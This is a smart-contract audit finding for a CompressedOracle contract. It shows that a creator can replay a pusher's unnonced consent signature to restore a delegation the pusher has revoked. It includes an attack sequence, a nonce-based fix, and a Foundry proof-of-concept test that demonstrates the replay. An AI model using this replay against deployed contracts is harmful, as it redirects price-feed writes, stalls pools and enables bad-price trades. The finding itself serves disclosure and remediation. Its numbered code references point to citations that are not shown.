### Title
Pusher Self-Revocation Is Ineffective While a Valid Consent Signature Exists — Creator Can Replay `allowPushers` to Re-Establish Delegation After `revokePusher`, Redirecting Feed Writes and Starving the Pusher's Own Namespace - (File: `smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`revokePusher()` clears `namespaceRemapping[pusher]` but does not invalidate the pusher's original EIP-191 consent signature. Because `allowPushers` has no nonce and no used-signature registry, a creator who holds a still-valid (pre-deadline) signature can call `allowPushers` again immediately after the pusher revokes, atomically re-establishing the delegation. The pusher cannot achieve a durable exit until the deadline timestamp passes.

---

### Finding Description

`allowPushers` signs consent over `(chainid, oracle, deadline, pusher, creator)` with no nonce: [1](#0-0) 

The code's own NatSpec acknowledges the risk but presents the deadline as the complete fix: [2](#0-1) 

`revokePusher` clears the mapping but has no mechanism to burn or invalidate the original signature: [3](#0-2) 

`_ensureDeadline` only checks `block.timestamp <= deadline` — it does not track whether a signature has already been used or revoked: [4](#0-3) 

**Attack sequence:**

1. Pusher signs consent for creator with `deadline = block.timestamp + 365 days`.
2. Creator calls `allowPushers(deadline, [pusher], [sig])` → `namespaceRemapping[pusher] = creator`.
3. Pusher calls `revokePusher()` → `namespaceRemapping[pusher] = address(0)`.
4. Creator immediately calls `allowPushers(deadline, [pusher], [sig])` again with the **same signature** → `namespaceRemapping[pusher] = creator` again.
5. Steps 3–4 can repeat indefinitely until `deadline` expires.

The fallback push path resolves the namespace at call time: [5](#0-4) 

So every push the pusher makes after step 4 lands in the **creator's** namespace, not the pusher's own.

---

### Impact Explanation

Two concrete harms reach pools:

**1. Pusher's own namespace is starved → pools consuming pusher's feeds halt.**
After re-establishment, the pusher's fallback writes go to the creator's namespace. The pusher's own feeds receive no new data. `PriceProvider._getBidAndAskPrice` calls `_isStale(refTime, block.timestamp, MAX_TIME_DELTA)`: [6](#0-5) 

Stale → `(0, type(uint128).max)` → `getBidAndAskPrice` reverts `FeedStalled`. Any pool whose `IPriceProvider` reads the pusher's own feeds becomes unable to swap or withdraw liquidity.

**2. Creator's namespace receives prices intended for a different context → bad-price execution.**
If the pusher's price stream is calibrated for a different asset pair or pool than the creator's, the creator's pools execute swaps at wrong bid/ask quotes derived from those prices. The `PriceProvider` pipeline applies the creator's `confidenceParam`, `marginStep`, and `priceGuard` to the pusher's raw price, producing a bid/ask that does not reflect the true market for the creator's pool's token pair. [7](#0-6) 

---

### Likelihood Explanation

- The trigger (`allowPushers` with a previously used signature) is a **normal, permissionless, on-chain call** — no admin role required.
- The only precondition is that the creator retains the pusher's original signature and the deadline has not yet expired.
- Consent signatures are typically shared off-chain (e.g., via a UI or API) and are not ephemeral; a creator who received one can store it indefinitely.
- The pusher has no on-chain mechanism to invalidate the signature before the deadline; their only recourse is to wait for the deadline to expire or to negotiate a new signature with a shorter deadline — neither of which is enforced by the protocol.
- Likelihood: **Medium** (requires a malicious or uncooperative creator, but the attack is trivially executable once the signature is in hand).

---

### Recommendation

Track used signatures or add a per-pusher revocation nonce. One minimal fix: maintain a `mapping(address => uint256) public pusherNonce` and include the nonce in the signed digest. `revokePusher` increments the nonce, invalidating all prior signatures for that pusher regardless of their deadline:

```solidity
// In allowPushers signature hash:
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender, pusherNonce[pusher]))

// In revokePusher:
pusherNonce[msg.sender]++;
namespaceRemapping[msg.sender] = address(0);
```

Alternatively, store a `revokedAt` timestamp per pusher and reject any `allowPushers` call that uses a signature whose deadline predates `revokedAt`.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {CompressedOracleV1} from
    "smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol";
import {IOffchainOracle} from "smart-contracts-poc/contracts/interfaces/IOffchainOracle.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {U64x32} from "smart-contracts-poc/contracts/oracles/utils/U64x32.sol";

contract ReplayRevokedDelegationPoC is Test {
    CompressedOracleV1 oracle;
    uint256 constant PUSHER_KEY = 0xBEEF;
    address pusher;
    address creator = address(0xC0FFEE);

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 60_000);
        pusher = vm.addr(PUSHER_KEY);
        vm.warp(1_700_000_000);
    }

    function testRevokedDelegationReplayable() public {
        uint256 deadline = block.timestamp + 365 days;

        // Pusher signs consent once
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // Step 1: Creator establishes delegation
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator);

        // Step 2: Pusher revokes
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0), "revoked");

        // Step 3: Creator replays the SAME signature — delegation re-established
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs); // no revert!
        assertEq(oracle.namespaceRemapping(pusher), creator, "delegation re-established after revoke");

        // Step 4: Pusher's push now lands in creator's namespace, not pusher's own
        uint56 tsMs = uint56(block.timestamp * 1000);
        uint48 raw = (uint48(900_000) << 16) | (uint48(5) << 8) | uint48(0);
        uint256 word = (uint256(tsMs) << 8) | uint256(uint8(2));
        word |= uint256(raw) << 208;

        vm.prank(pusher);
        (bool ok,) = address(oracle).call(abi.encodePacked(word));
        assertTrue(ok);

        // Pusher's own namespace is empty — their feeds are starved
        IOffchainOracle.OracleData memory ownData =
            oracle.getOracleData(oracle.feedIdOf(pusher, 2, 0));
        assertEq(ownData.price, 0, "pusher own namespace starved");

        // Creator's namespace received the push — wrong prices for creator's pools
        IOffchainOracle.OracleData memory creatorData =
            oracle.getOracleData(oracle.feedIdOf(creator, 2, 0));
        assertGt(creatorData.price, 0, "creator namespace received pusher's price");
    }
}
```

The test demonstrates that `revokePusher` provides no durable protection: the creator replays the original signature, re-establishes the delegation, and the pusher's subsequent writes land in the creator's namespace — starving the pusher's own feeds and injecting the pusher's prices into the creator's oracle namespace.

    function _getBidAndAskPrice() internal returns (uint128, uint128) {
        // 1. Read via the unified price(feedId, pool) path, forwarding the pool (msg.sender).
        //    refTime is already in seconds.
        (uint256 mid, uint256 spread, , uint256 refTime) =
            IPricedOracle(address(offchainOracle)).price(offchainFeedId, msg.sender);

        // 2. Staleness check
        if (_isStale(refTime, block.timestamp, MAX_TIME_DELTA)) {
            return (0, type(uint128).max);
        }

        // 3. Basic validity — price must be positive, spread must not be stalled marker
        if (mid == 0 || spread >= ORACLE_BPS) {
            return (0, type(uint128).max);
        }

        // 4. Price guard check (moved from oracle)
        (uint128 guardMin, uint128 guardMax) = offchainOracle.priceGuard(offchainFeedId);
        guardMax = guardMax == 0 ? type(uint128).max : guardMax;
        if (mid < guardMin || mid > guardMax) {
            return (0, type(uint128).max);
        }

        // 5. Compute bid/ask from mid + confidence-adjusted spread
        //    confidenceParam multiplies oracle spread; 0 means no spread
        uint256 adjustedSpread = spread * confidenceParam;
        (uint256 bid, uint256 ask) = _getBidAskFrom(mid, adjustedSpread);

        // 6. Apply marginStep adjustment
        (uint256 bidOut, bool bidOk) = _applyBidAdjustments(bid);
        if (!bidOk || bidOut > type(uint128).max) return (0, type(uint128).max);

        (uint256 askOut, bool askOk) = _applyAskAdjustments(ask);
        if (!askOk || askOut > type(uint128).max) return (0, type(uint128).max);

        // 7. Hard invariant: bid must be strictly less than ask.
        //    Can be violated when marginStep < 0 and confidence is too small.
        if (bidOut >= askOut) return (0, type(uint128).max);

        return (uint128(bidOut), uint128(askOut));
    }
